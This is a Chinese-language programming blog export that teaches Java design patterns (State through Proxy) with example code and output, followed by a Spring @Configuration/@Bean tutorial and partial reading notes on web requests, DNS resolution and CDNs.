1.0StatisticsDisplay.update: 1.0 1.0 1.0 JDK java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava 8. 状态（State）意图允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。 类图 实现糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。 123456789101112131415161718192021public interface State &#123; /** * 投入 25 分钱 */ void insertQuarter(); /** * 退回 25 分钱 */ void ejectQuarter(); /** * 转动曲柄 */ void turnCrank(); /** * 发放糖果 */ void dispense();&#125; 123456789101112131415161718192021222324252627282930public class HasQuarterState implements State &#123; private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert another quarter"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; @Override public void turnCrank() &#123; System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 1234567891011121314151617181920212223242526272829public class NoQuarterState implements State &#123; GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); &#125; @Override public void ejectQuarter() &#123; System.out.println("You haven't insert a quarter"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there's no quarter"); &#125; @Override public void dispense() &#123; System.out.println("You need to pay first"); &#125;&#125; 12345678910111213141516171819202122232425262728public class SoldOutState implements State &#123; GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("You can't insert a quarter, the machine is sold out"); &#125; @Override public void ejectQuarter() &#123; System.out.println("You can't eject, you haven't inserted a quarter yet"); &#125; @Override public void turnCrank() &#123; System.out.println("You turned, but there are no gumballs"); &#125; @Override public void dispense() &#123; System.out.println("No gumball dispensed"); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class SoldState implements State &#123; GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) &#123; this.gumballMachine = gumballMachine; &#125; @Override public void insertQuarter() &#123; System.out.println("Please wait, we're already giving you a gumball"); &#125; @Override public void ejectQuarter() &#123; System.out.println("Sorry, you already turned the crank"); &#125; @Override public void turnCrank() &#123; System.out.println("Turning twice doesn't get you another gumball!"); &#125; @Override public void dispense() &#123; gumballMachine.releaseBall(); if (gumballMachine.getCount() &gt; 0) &#123; gumballMachine.setState(gumballMachine.getNoQuarterState()); &#125; else &#123; System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768public class GumballMachine &#123; private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) &#123; count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs &gt; 0) &#123; state = noQuarterState; &#125; else &#123; state = soldOutState; &#125; &#125; public void insertQuarter() &#123; state.insertQuarter(); &#125; public void ejectQuarter() &#123; state.ejectQuarter(); &#125; public void turnCrank() &#123; state.turnCrank(); state.dispense(); &#125; public void setState(State state) &#123; this.state = state; &#125; public void releaseBall() &#123; System.out.println("A gumball comes rolling out the slot..."); if (count != 0) &#123; count -= 1; &#125; &#125; public State getSoldOutState() &#123; return soldOutState; &#125; public State getNoQuarterState() &#123; return noQuarterState; &#125; public State getHasQuarterState() &#123; return hasQuarterState; &#125; public State getSoldState() &#123; return soldState; &#125; public int getCount() &#123; return count; &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; public static void main(String[] args) &#123; GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); &#125;&#125; 12345678910111213141516171819202122232425You insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterQuarter returnedYou turned, but there's no quarterYou need to pay firstYou insert a quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...You haven't insert a quarterYou insert a quarterYou can't insert another quarterYou turned...A gumball comes rolling out the slot...You insert a quarterYou turned...A gumball comes rolling out the slot...Oops, out of gumballsYou can't insert a quarter, the machine is sold outYou turned, but there are no gumballsNo gumball dispensed 9. 策略（Strategy）意图定义一系列算法，封装每个算法，并使它们可以互换。 策略模式可以让算法独立于使用它的客户端。 类图 Strategy 接口定义了一个算法族，它们都具有 BehaviorInterface() 方法。 Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 BehaviorInterface()，setStrategy(in Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。 与状态模式的比较状态模式的类图和策略模式一样，并且都是能够动态改变对象的行为。 但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。 所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。 状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。 实现设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。 123public interface QuackBehavior &#123; void quack();&#125; 123456public class Quack implements QuackBehavior &#123; @Override public void quack() &#123; System.out.println("quack!"); &#125;&#125; 123456public class Squeak implements QuackBehavior&#123; @Override public void quack() &#123; System.out.println("squeak!"); &#125;&#125; 12345678910111213public class Duck &#123; private QuackBehavior quackBehavior; public void performQuack() &#123; if (quackBehavior != null) &#123; quackBehavior.quack(); &#125; &#125; public void setQuackBehavior(QuackBehavior quackBehavior) &#123; this.quackBehavior = quackBehavior; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); &#125;&#125; 12squeak!quack! JDK java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter() 10. 模板方法（Template Method）意图定义算法框架，并将一些步骤的实现延迟到子类。 通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。 类图 实现冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。 123456789101112131415161718192021public abstract class CaffeineBeverage &#123; final void prepareRecipe() &#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; abstract void brew(); abstract void addCondiments(); void boilWater() &#123; System.out.println("boilWater"); &#125; void pourInCup() &#123; System.out.println("pourInCup"); &#125;&#125; 1234567891011public class Coffee extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Coffee.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Coffee.addCondiments"); &#125;&#125; 1234567891011public class Tea extends CaffeineBeverage&#123; @Override void brew() &#123; System.out.println("Tea.brew"); &#125; @Override void addCondiments() &#123; System.out.println("Tea.addCondiments"); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); &#125;&#125; 123456789boilWaterCoffee.brewpourInCupCoffee.addCondiments-----------boilWaterTea.brewpourInCupTea.addCondiments JDK java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf() 11. 访问者（Visitor）意图为一个对象结构（比如组合结构）增加新能力。 类图 Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作 ConcreteVisitor：具体访问者，存储遍历过程中的累计结果 ObjectStructure：对象结构，可以是组合结构，或者是一个集合。 实现123public interface Element &#123; void accept(Visitor visitor);&#125; 1234567891011121314class CustomerGroup &#123; private List&lt;Customer&gt; customers = new ArrayList&lt;&gt;(); void accept(Visitor visitor) &#123; for (Customer customer : customers) &#123; customer.accept(visitor); &#125; &#125; void addCustomer(Customer customer) &#123; customers.add(customer); &#125;&#125; 123456789101112131415161718192021222324public class Customer implements Element &#123; private String name; private List&lt;Order&gt; orders = new ArrayList&lt;&gt;(); Customer(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; void addOrder(Order order) &#123; orders.add(order); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Order order : orders) &#123; order.accept(visitor); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930public class Order implements Element &#123; private String name; private List&lt;Item&gt; items = new ArrayList(); Order(String name) &#123; this.name = name; &#125; Order(String name, String itemName) &#123; this.name = name; this.addItem(new Item(itemName)); &#125; String getName() &#123; return name; &#125; void addItem(Item item) &#123; items.add(item); &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); for (Item item : items) &#123; item.accept(visitor); &#125; &#125;&#125; 12345678910111213141516public class Item implements Element &#123; private String name; Item(String name) &#123; this.name = name; &#125; String getName() &#123; return name; &#125; public void accept(Visitor visitor) &#123; visitor.visit(this); &#125;&#125; 1234567public interface Visitor &#123; void visit(Customer customer); void visit(Order order); void visit(Item item);&#125; 123456789101112131415161718192021222324252627public class GeneralReport implements Visitor &#123; private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) &#123; System.out.println(customer.getName()); customersNo++; &#125; public void visit(Order order) &#123; System.out.println(order.getName()); ordersNo++; &#125; public void visit(Item item) &#123; System.out.println(item.getName()); itemsNo++; &#125; public void displayResults() &#123; System.out.println("Number of customers: " + customersNo); System.out.println("Number of orders: " + ordersNo); System.out.println("Number of items: " + itemsNo); &#125;&#125; 1234567891011121314151617181920212223public class Client &#123; public static void main(String[] args) &#123; Customer customer1 = new Customer("customer1"); customer1.addOrder(new Order("order1", "item1")); customer1.addOrder(new Order("order2", "item1")); customer1.addOrder(new Order("order3", "item1")); Order order = new Order("order_a"); order.addItem(new Item("item_a1")); order.addItem(new Item("item_a2")); order.addItem(new Item("item_a3")); Customer customer2 = new Customer("customer2"); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); &#125;&#125; 123456789101112131415customer1order1item1order2item1order3item1customer2order_aitem_a1item_a2item_a3Number of customers: 2Number of orders: 4Number of items: 6 JDK javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor 12. 空对象（Null）意图使用什么都不做的空对象来替代 NULL。 一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。 类图 实现123public abstract class AbstractOperation &#123; abstract void request();&#125; 123456public class RealOperation extends AbstractOperation &#123; @Override void request() &#123; System.out.println("do something"); &#125;&#125; 123456public class NullOperation extends AbstractOperation&#123; @Override void request() &#123; // do nothing &#125;&#125; 12345678910111213public class Client &#123; public static void main(String[] args) &#123; AbstractOperation abstractOperation = func(-1); abstractOperation.request(); &#125; public static AbstractOperation func(int para) &#123; if (para &lt; 0) &#123; return new NullOperation(); &#125; return new RealOperation(); &#125;&#125; 四、结构型1. 适配器（Adapter）意图把一个类接口转换成另一个用户需要的接口。 类图 实现鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。 要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！ 123public interface Duck &#123; void quack();&#125; 123public interface Turkey &#123; void gobble();&#125; 123456public class WildTurkey implements Turkey &#123; @Override public void gobble() &#123; System.out.println("gobble!"); &#125;&#125; 123456789101112public class TurkeyAdapter implements Duck &#123; Turkey turkey; public TurkeyAdapter(Turkey turkey) &#123; this.turkey = turkey; &#125; @Override public void quack() &#123; turkey.gobble(); &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); &#125;&#125; JDK java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter 2. 桥接（Bridge）意图将抽象与实现分离开来，使它们可以独立变化。 类图 Abstraction：定义抽象类的接口 Implementor：定义实现类接口 实现RemoteControl 表示遥控器，指代 Abstraction。 TV 表示电视，指代 Implementor。 桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。 1234567public abstract class TV &#123; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 12345678910111213141516public class Sony extends TV&#123; @Override public void on() &#123; System.out.println("Sony.on()"); &#125; @Override public void off() &#123; System.out.println("Sony.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("Sony.tuneChannel()"); &#125;&#125; 12345678910111213141516public class RCA extends TV&#123; @Override public void on() &#123; System.out.println("RCA.on()"); &#125; @Override public void off() &#123; System.out.println("RCA.off()"); &#125; @Override public void tuneChannel() &#123; System.out.println("RCA.tuneChannel()"); &#125;&#125; 12345678910111213public abstract class RemoteControl &#123; protected TV tv; public RemoteControl(TV tv) &#123; this.tv = tv; &#125; public abstract void on(); public abstract void off(); public abstract void tuneChannel();&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl1 extends RemoteControl &#123; public ConcreteRemoteControl1(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl1.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl1.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 1234567891011121314151617181920212223public class ConcreteRemoteControl2 extends RemoteControl &#123; public ConcreteRemoteControl2(TV tv) &#123; super(tv); &#125; @Override public void on() &#123; System.out.println("ConcreteRemoteControl2.on()"); tv.on(); &#125; @Override public void off() &#123; System.out.println("ConcreteRemoteControl2.off()"); tv.off(); &#125; @Override public void tuneChannel() &#123; System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); &#125;&#125; JDK AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC 3. 组合（Composite）意图将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。 类图组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。 组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。 实现1234567891011121314151617public abstract class Component &#123; protected String name; public Component(String name) &#123; this.name = name; &#125; public void print() &#123; print(0); &#125; abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);&#125; 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.List;public class Composite extends Component &#123; private List&lt;Component&gt; child; public Composite(String name) &#123; super(name); child = new ArrayList&lt;&gt;(); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("Composite:" + name); for (Component component : child) &#123; component.print(level + 1); &#125; &#125; @Override public void add(Component component) &#123; child.add(component); &#125; @Override public void remove(Component component) &#123; child.remove(component); &#125;&#125; 1234567891011121314151617181920212223public class Leaf extends Component &#123; public Leaf(String name) &#123; super(name); &#125; @Override void print(int level) &#123; for (int i = 0; i &lt; level; i++) &#123; System.out.print("--"); &#125; System.out.println("left:" + name); &#125; @Override public void add(Component component) &#123; throw new UnsupportedOperationException(); // 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点 &#125; @Override public void remove(Component component) &#123; throw new UnsupportedOperationException(); &#125;&#125; 123456789101112131415161718public class Client &#123; public static void main(String[] args) &#123; Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); &#125;&#125; 1234567Composite:root--left:1--Composite:2----left:21----Composite:22------left:221--left:3 JDK javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection) 4. 装饰（Decorator）意图为对象动态添加功能。 类图装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。 实现设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。 下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。 123public interface Beverage &#123; double cost();&#125; 123456public class DarkRoast implements Beverage&#123; @Override public double cost() &#123; return 1; &#125;&#125; 123456public class HouseBlend implements Beverage &#123; @Override public double cost() &#123; return 1; &#125;&#125; 123public abstract class CondimentDecorator implements Beverage &#123; protected Beverage beverage;&#125; 1234567891011public class Milk extends CondimentDecorator &#123; public Milk(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 1234567891011public class Mocha extends CondimentDecorator &#123; public Mocha(Beverage beverage) &#123; this.beverage = beverage; &#125; @Override public double cost() &#123; return 1 + beverage.cost(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); &#125;&#125; 13.0 设计原则类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。 JDK java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap 5. 外观（Facade）意图提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。 类图 实现观看电影需要操作很多电器，使用外观模式可以实现一键看电影功能。 12345678910111213public class SubSystem &#123; public void turnOnTV() &#123; System.out.println("turnOnTV()"); &#125; public void setCD(String cd) &#123; System.out.println("setCD( " + cd + " )"); &#125; public void starWatching()&#123; System.out.println("starWatching()"); &#125;&#125; 123456789public class Facade &#123; private SubSystem subSystem = new SubSystem(); public void watchMovie() &#123; subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.starWatching(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; Facade facade = new Facade(); facade.watchMovie(); &#125;&#125; 设计原则最少知识原则：只和你的密友谈话。也就是客户对象所需要交互的对象应当尽可能少。 6. 享元（Flyweight）意图利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。 类图 Flyweight：享元对象 IntrinsicState：内部状态，相同的项元对象共享 ExtrinsicState：外部状态 实现123public interface Flyweight &#123; void doOperation(String extrinsicState);&#125; 123456789101112131415public class ConcreteFlyweight implements Flyweight &#123; private String intrinsicState; public ConcreteFlyweight(String intrinsicState) &#123; this.intrinsicState = intrinsicState; &#125; @Override public void doOperation(String extrinsicState) &#123; System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); &#125;&#125; 1234567891011121314import java.util.HashMap;public class FlyweightFactory &#123; private HashMap&lt;String, Flyweight&gt; flyweights = new HashMap&lt;&gt;(); Flyweight getFlyweight(String intrinsicState) &#123; if (!flyweights.containsKey(intrinsicState)) &#123; Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); &#125; return flyweights.get(intrinsicState); &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); &#125;&#125; 123456Object address: 1163157884IntrinsicState: aaExtrinsicState: xObject address: 1163157884IntrinsicState: aaExtrinsicState: y JDKJava 利用缓存来加速大量小对象的访问时间。 java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char) 7. 代理（Proxy）意图控制对其它对象的访问。 类图代理有以下四类： 远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。 虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。 保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。 智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数，比如智能智能；当第一次引用一个持久化对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。 实现以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。 123public interface Image &#123; void showImage();&#125; 123456789101112131415161718192021222324252627282930313233public class HighResolutionImage implements Image &#123; private URL imageURL; private long startTime; private int height; private int width; public int getHeight() &#123; return height; &#125; public int getWidth() &#123; return width; &#125; public HighResolutionImage(URL imageURL) &#123; this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; &#125; public boolean isLoad() &#123; // 模拟图片加载，延迟 3s 加载完成 long endTime = System.currentTimeMillis(); return endTime - startTime &gt; 3000; &#125; @Override public void showImage() &#123; System.out.println("Real Image: " + imageURL); &#125;&#125; 1234567891011121314151617181920public class ImageProxy implements Image &#123; private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) &#123; this.highResolutionImage = highResolutionImage; &#125; @Override public void showImage() &#123; while (!highResolutionImage.isLoad()) &#123; try &#123; System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; highResolutionImage.showImage(); &#125;&#125; 123456789public class ImageViewer &#123; public static void main(String[] args) throws Exception &#123; String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); &#125;&#125; 原文：设计模式]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.组件注册-@Configuration & @Bean]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E7%BB%84%E4%BB%B6%E6%B3%A8%E5%86%8C-%40Configuration%20%26%20%40Bean%2F</url>
    <content type="text"><![CDATA[学习spring注解版来实现组件的注册。 新建一个maven工程，引入spring-context依赖。 1. @Configuration &amp; @Bean给容器注册组件以往的方式注册一个bean新建一个实体类Person： 12345678@Data@AllArgsConstructor@NoArgsConstructor@ToStringpublic class Person &#123; private String name; private Integer age;&#125; 那么，我们可以在beans.xml中注册这个bean，给他赋值。 12345678910&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="person" class="com.swg.bean.Person"&gt; &lt;property name="age" value="10"/&gt; &lt;property name="name" value="张三"/&gt; &lt;/bean&gt;&lt;/beans&gt; 那么，我们就可以拿到张三这个人了： 1234567public class MainTest &#123; public static void main(String[] args) &#123; ApplicationContext applicationContext = new ClassPathXmlApplicationContext("beans.xml"); Person person = (Person) applicationContext.getBean("person"); System.out.println(person); &#125;&#125;//输出：Person(name=张三, age=10) 注解的方式注册bean 配置类 = 配置文件 @Configuration 告诉spring这是一个配置类 @Bean 给容器注册一个Bean，类型为返回值类型，id默认是方法名 1234567@Configurationpublic class MainConfig &#123; @Bean public Person person()&#123; return new Person("李四",20); &#125;&#125; 如何获取这个bean呢？ 123ApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig.class);Person person = applicationContext.getBean(Person.class);System.out.println(person);//Person(name=李四, age=20) 我们还可以根据类型来获取这个bean在容器中名字是什么：1234String[] names = applicationContext.getBeanNamesForType(Person.class);for(String name:names)&#123; System.out.println(name);//person&#125; 上面提到，id默认是方法名。如果我们修改MainConfig中的person这个方法名，果然打印结果也随着这个方法名改变而改变；也可以自己另外指定这个bean在容器中的名字：@Bean(&quot;hello&quot;)，那么这个bean的名字就变成了hello.]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.深入Web请求过程]]></title>
    <url>%2F2018%2F07%2F21%2F1.%E6%B7%B1%E5%85%A5Web%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[《深入分析Java Web技术内幕》第一章读书笔记。 B/S网络架构概述B/S 网络架构从前端到后端都得到了简化，都基于统一的应用层协议 HTTP 来交互数据，与大多数传统的 C/S 互联网应用程序采用的长连接的交互模式不同， HTTP 采用无状态的短连接的通信方式。通常情况下，一次请求就完成了一次数据交互，通常也对应一个业务逻辑，然后这次通信连接就断开了。采用这种方式是为了能够同时服务更多的用户，因为当前互联网应用每天都会处理上亿的请求，不可能每个用户访问一次后就一直保持这个连接。 如何发起一个请求如何发起一个 HTTP 请求和如何建立一个 Socket 连接区别不大，只不过 outputStream.write 写的二进制字节数据格式要符合 HTTP 。 浏览器在建立 Socket 连接之前，必须根据地址栏里输入的 URL 的域名 DNS 解析出 IP 地址，再根据这个 IP 地址和默认的80端口与远程服务器建立 Socket 连接，然后浏览器根据这个 URL 组装成一个 get 类型的 HTTP 请求头，通过 outputStream.write 发送到目标服务器，服务器等待 inputStream.read 返回数据，最后断开这个连接。 一句话：发起一个 HTTP 请求的过程就是建立一个 Socket 通信的过程。 DNS域名解析过程 浏览器检查缓存中有没有这个域名对应的解析过的IP地址，这个缓存有大小和时间的限制 如果用户的浏览器缓存中没有，浏览器会查找操作系统缓存中是否有这个域名对应的DNS解析结果。比如windows下的hosts文件地址解析。 前面两步都是在本机完成的，如果还是无法解析，就会真正请求域名服务器来解析域名了。那么就要知道域名服务器在哪，其实我们主机的网络配置中会有一项信息是“DNS服务器地址”，操作系统会把域名发送给这个LDNS，也就是本地区的域名服务器，这个DNS通常会提供给你本地互联网接入的一个DNS解析服务。假如你在学校接入互联网，那么DNS服务器一定在你的学校。 如果LDNS仍然无法命中，就直接到Root Server域名服务器请求解析。 根域名服务器会返回给本地域名服务器一个所查询的主域名服务器(gTLD Server)地址。gTLD是国际顶级域名服务器，如.com,.cn,.org等 本地域名服务器(Local DNS Server)再向上一步返回的gTLD服务器发送请求 接受请求的gTLD服务器查找并返回此域名对应的Name Server域名服务器的地址，这个Name Server通常就是你注册的域名服务器，例如你在某个域名服务提供商申请的域名，那么这个域名解析任务就是由这个域名提供商的服务器来完成。 Name Server域名服务器会查询存储的域名和IP的映射关系表，在正常情况下丢根据域名得到目标IP记录，联通一个TTL值返回给DNS Server域名服务器。 返回给该域名对应的IP和TTL值，Local DNS Server会缓存这个域名和IP的对应关系，缓存的时间由TTL值控制。 把解析的结果返回给用户，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。 实际可能比这个过程更加复杂。 CDN工作机制CDN就是内容分布网络(Content Delivery Network),他是构筑在现有网络上的一种先进的流量分配网络。 目的是将网站的内容发布在最接近用户的网络“边缘”，使用户可以就近取得所需的内容，提高用户访问网站的相应速度。 目前CND都以缓存网站中的静态数据为主，如CSS，JS，图片和静态页面等数据。用户在从主站服务器请求到动态内容后，再从CDN上下载这些静态数据，从而加速网页数据内容的下载速度。 负载均衡 链路负载均衡：也就是前面提到的通过DNS解析成不同的IP，然后用户根据这个IP来访问不同的目标服务器。这种方式是由DNS得解析完成，那么就是由Global DNS 